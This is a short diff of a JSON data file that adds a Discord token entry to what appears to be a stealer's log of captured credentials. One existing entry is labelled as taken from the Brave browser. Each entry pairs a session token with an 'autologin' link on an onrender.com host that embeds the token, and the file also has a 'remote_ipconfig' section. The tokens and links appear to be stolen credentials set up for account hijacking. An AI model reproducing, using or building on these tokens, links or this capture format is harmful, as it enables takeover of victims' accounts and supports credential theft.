@@ -811,6 +811,12 @@
             "token": "[Brave Browser Discord Token]:\nUxMDA50Dc2MDM5NzYyMzQ1MA.G24384.h\nBGn5eBDuNCeUMAK1YRCCpYDRmTUiuR4aF\n28-w",
             "link": "https://threesrh-system-data.onrender.com/autologin?platform=discord&token=%5BBrave%20Browser%20Discord%20Token%5D%3A%0AUxMDA50Dc2MDM5NzYyMzQ1MA.G24384.h%0ABGn5eBDuNCeUMAK1YRCCpYDRmTUiuR4aF%0A28-w",
             "time": 1789438642
+        },
+        {
+            "platform": "discord",
+            "token": "UxMDA5ODc2MDM5NzYyMzQ1MA.G24384.hBGn5eBDuNCeUMAK1YRCCpYDRmTUiuR4aFz8-w",
+            "link": "https://threesrh-system-data-7.onrender.com/autologin?platform=discord&token=UxMDA5ODc2MDM5NzYyMzQ1MA.G24384.hBGn5eBDuNCeUMAK1YRCCpYDRmTUiuR4aFz8-w",
+            "time": 1789969650
         }
     ],
     "remote_ipconfig": {
